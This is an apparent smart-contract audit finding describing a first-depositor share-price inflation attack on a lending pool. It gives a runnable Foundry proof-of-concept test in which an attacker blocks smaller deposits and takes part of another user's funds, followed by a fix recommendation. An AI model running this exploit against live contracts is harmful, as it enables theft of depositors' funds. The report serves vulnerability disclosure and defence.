# Attacker can blocks deposits and steal users funds

## Summary
An attacker can block deposits and steal user's funds

## Vulnerability Detail
with depositing 1 wei & being the first depositor attacker can steal other user's funds by sending a large amount of tokens after depositing 1 wei directly to the pool

for example, by sending `10e18` or `10 ether` now attacker changes the share price to 10 eth per only 1 wei 

and because of this now users with deposit amounts under 10 ether will revert due to `Pool: 0 shares` require in `Pool.sol#L325`

 also if any user deposits `15 eth` they will lose 5 eth because every share is 10 eth and we cant mint a 0.5 share if it's only 1 wei 

here is a complete detailed attack scenario: (you can run it in `Pool.t.sol`)
```solidity
function testAttack0() public {
        address alice = address(0xFF);
        address attacker = address(0xAA);

        MockERC20 collateralToken = new MockERC20(0, 18); // owner is this
        MockERC20 loanToken = new MockERC20(3500, 18); // owner is this 
        Pool pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), 1e18, 0.8e18, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);
        
        loanToken.transfer(address(alice), 1999);
        loanToken.transfer(address(attacker), 1001);

        vm.startPrank(attacker);
        { // ATTACKER ACTIONS
            loanToken.approve(address(pool), 1);
            pool.deposit(1); // first & deposited 1 wei 
            loanToken.transfer(address(pool), 1000); // transfers 1000 tokens directly to the pool
        }
        vm.stopPrank();

        vm.startPrank(alice);
        { // ALICE ACTIONS
            loanToken.approve(address(pool), 2000);
            vm.expectRevert();
            pool.deposit(1000); // REVERT -> Pool: 0 shares
            pool.deposit(1999); // SUCCESS
            assertEq(pool.balanceOf(alice), 1); // but Only 1 share
        }
        vm.stopPrank();

        vm.startPrank(attacker);
        { // ATTACKER ACTIONS 2
            assertEq(loanToken.balanceOf(attacker), 0); // balance is 0
            pool.withdraw(2**256-1);
            assertEq(loanToken.balanceOf(attacker), 1500); // balance is 1450
        }
        vm.stopPrank();


        // LOGS 
        emit log_named_uint("Attacker Shares", pool.balanceOf(attacker));
        emit log_named_uint("Attacker Tokens", loanToken.balanceOf(attacker));
        emit log_named_uint("Alices Shares", pool.balanceOf(alice));
        emit log_named_uint("Alices Tokens", loanToken.balanceOf(alice));
        emit log_named_uint("Pool Tokens", loanToken.balanceOf(address(pool)));


    }
```
“This may happen in a larger scale”

CASE 2: 

if 1 wei share = 10 eth and Alice have 1 share and wants to withdraw 9 eth

and withdrawing 9 eth will round up to 1 share Alice shares are now `0` and she lost 1 eth 

`Pool.sol#L370`
## Impact
1. share price manipulation 
2. users lose funds 
3. attacker can DOS the deposit function
4. fee calculation will be `0` mostly

## Tool used

Manual Review, forge

## Recommendation
having a `underlyingBalance` for deposited tokens will solve this problem and not using `LOAN_TOKEN.balanceOf(*address*(*this*));` when calculating share amounts 

to be clear I mean having a `uint256` variable and storing user's total deposits instead of getting contract balance every time
